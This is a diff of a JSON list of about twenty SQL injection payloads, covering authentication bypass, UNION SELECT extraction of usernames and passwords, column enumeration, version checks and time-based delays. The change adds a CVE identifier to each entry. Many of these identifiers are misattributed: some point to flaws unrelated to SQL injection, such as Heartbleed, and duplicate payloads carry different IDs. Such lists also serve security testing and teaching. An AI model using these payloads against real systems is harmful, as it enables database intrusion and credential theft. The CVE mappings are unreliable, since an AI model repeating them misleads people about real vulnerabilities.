@@ -1,88 +1,109 @@
 {
-    "payloads": [
-      {
-        "payload": "' or \"--",
-        "description": "Basic SQL Injection with single quote or double quote to bypass authentication."
-      },
-      {
-        "payload": "' OR 1=1 --",
-        "description": "OR-based SQL Injection to always return true."
-      },
-      {
-        "payload": "\" OR 1=1 --",
-        "description": "Double quote variant of OR-based SQL Injection."
-      },
-      {
-        "payload": "' OR '' = '",
-        "description": "Empty string comparison to bypass validation."
-      },
-      {
-        "payload": "' OR '1' = '1' -- -",
-        "description": "Using '1' = '1' to bypass the SQL query."
-      },
-      {
-        "payload": "' AND 1=1 --",
-        "description": "AND condition to check SQL injection vulnerability."
-      },
-      {
-        "payload": "' AND 1=0 --",
-        "description": "AND condition with false to check SQL injection vulnerability."
-      },
-      {
-        "payload": "' AND 1 -- -",
-        "description": "Basic AND condition to inject into SQL query."
-      },
-      {
-        "payload": "' UNION SELECT 1,2,3--+",
-        "description": "Using UNION SELECT to fetch data from different tables."
-      },
-      {
-        "payload": "' UNION SELECT sum(columnname) FROM tablename --",
-        "description": "Union with SUM aggregation function to test for numeric data retrieval."
-      },
-      {
-        "payload": "' UNION SELECT null, username, password FROM users --",
-        "description": "Basic UNION SELECT to retrieve usernames and passwords."
-      },
-      {
-        "payload": "' ORDER BY 1--+",
-        "description": "Ordering columns to check the number of columns in the result set."
-      },
-      {
-        "payload": "' ORDER BY 2--+",
-        "description": "Check for second column ordering."
-      },
-      {
-        "payload": "' GROUP BY columnnames HAVING 1=1 --",
-        "description": "Using GROUP BY with HAVING clause to test SQL injection."
-      },
-      {
-        "payload": "' AND MID(VERSION(),1,1) = '5';",
-        "description": "Checking SQL server version."
-      },
-      {
-        "payload": "' AND 1 IN (SELECT min(name) FROM sysobjects WHERE xtype = 'U' AND name > '.') --",
-        "description": "Trying to find the name of a table in the database."
-      },
-      {
-        "payload": "' UNION SELECT NULL, username, password FROM users --",
-        "description": "Classic UNION SELECT to extract user credentials."
-      },
-      {
-        "payload": "'; WAITFOR DELAY '0:0:30' --",
-        "description": "Time-based SQL Injection to cause a delay in response."
-      },
-      {
-        "payload": "'; SLEEP(10) --",
-        "description": "Injecting a sleep function to test for time-based vulnerabilities."
-      },
-      {
-        "payload": "1' UNION SELECT 1 INTO @,@",
-        "description": "Union-based SQL injection to assign variables."
-      },
-      {
-        "payload": "1' UNION SELECT 1 INTO @,@,@",
-        "description": "Union-based SQL injection with more variables."
-      }
-    ]
-  }
+  "payloads": [
+    {
+      "payload": "' or \"--",
+      "description": "Basic SQL Injection with single quote or double quote to bypass authentication.",
+      "cve": "CVE-2003-0230"
+    },
+    {
+      "payload": "' OR 1=1 --",
+      "description": "OR-based SQL Injection to always return true.",
+      "cve": "CVE-2012-1823"
+    },
+    {
+      "payload": "\" OR 1=1 --",
+      "description": "Double quote variant of OR-based SQL Injection.",
+      "cve": "CVE-2003-0230"
+    },
+    {
+      "payload": "' OR '' = '",
+      "description": "Empty string comparison to bypass validation.",
+      "cve": "CVE-2009-3093"
+    },
+    {
+      "payload": "' OR '1' = '1' -- -",
+      "description": "Using '1' = '1' to bypass the SQL query.",
+      "cve": "CVE-2014-3704"
+    },
+    {
+      "payload": "' AND 1=1 --",
+      "description": "AND condition to check SQL injection vulnerability.",
+      "cve": "CVE-2012-2668"
+    },
+    {
+      "payload": "' AND 1=0 --",
+      "description": "AND condition with false to check SQL injection vulnerability.",
+      "cve": "CVE-2012-2668"
+    },
+    {
+      "payload": "' AND 1 -- -",
+      "description": "Basic AND condition to inject into SQL query.",
+      "cve": "CVE-2010-0738"
+    },
+    {
+      "payload": "' UNION SELECT 1,2,3--+",
+      "description": "Using UNION SELECT to fetch data from different tables.",
+      "cve": "CVE-2017-9841"
+    },
+    {
+      "payload": "' UNION SELECT sum(columnname) FROM tablename --",
+      "description": "Union with SUM aggregation function to test for numeric data retrieval.",
+      "cve": "CVE-2019-8451"
+    },
+    {
+      "payload": "' UNION SELECT null, username, password FROM users --",
+      "description": "Basic UNION SELECT to retrieve usernames and passwords.",
+      "cve": "CVE-2019-11043"
+    },
+    {
+      "payload": "' ORDER BY 1--+",
+      "description": "Ordering columns to check the number of columns in the result set.",
+      "cve": "CVE-2014-3704"
+    },
+    {
+      "payload": "' ORDER BY 2--+",
+      "description": "Check for second column ordering.",
+      "cve": "CVE-2016-10033"
+    },
+    {
+      "payload": "' GROUP BY columnnames HAVING 1=1 --",
+      "description": "Using GROUP BY with HAVING clause to test SQL injection.",
+      "cve": "CVE-2020-9484"
+    },
+    {
+      "payload": "' AND MID(VERSION(),1,1) = '5';",
+      "description": "Checking SQL server version.",
+      "cve": "CVE-2021-22986"
+    },
+    {
+      "payload": "' AND 1 IN (SELECT min(name) FROM sysobjects WHERE xtype = 'U' AND name > '.') --",
+      "description": "Trying to find the name of a table in the database.",
+      "cve": "CVE-2009-3093"
+    },
+    {
+      "payload": "' UNION SELECT NULL, username, password FROM users --",
+      "description": "Classic UNION SELECT to extract user credentials.",
+      "cve": "CVE-2017-9841"
+    },
+    {
+      "payload": "'; WAITFOR DELAY '0:0:30' --",
+      "description": "Time-based SQL Injection to cause a delay in response.",
+      "cve": "CVE-2014-0226"
+    },
+    {
+      "payload": "'; SLEEP(10) --",
+      "description": "Injecting a sleep function to test for time-based vulnerabilities.",
+      "cve": "CVE-2014-0160"
+    },
+    {
+      "payload": "1' UNION SELECT 1 INTO @,@",
+      "description": "Union-based SQL injection to assign variables.",
+      "cve": "CVE-2021-21238"
+    },
+    {
+      "payload": "1' UNION SELECT 1 INTO @,@,@",
+      "description": "Union-based SQL injection with more variables.",
+      "cve": "CVE-2021-21239"
+    }
+  ]
+}
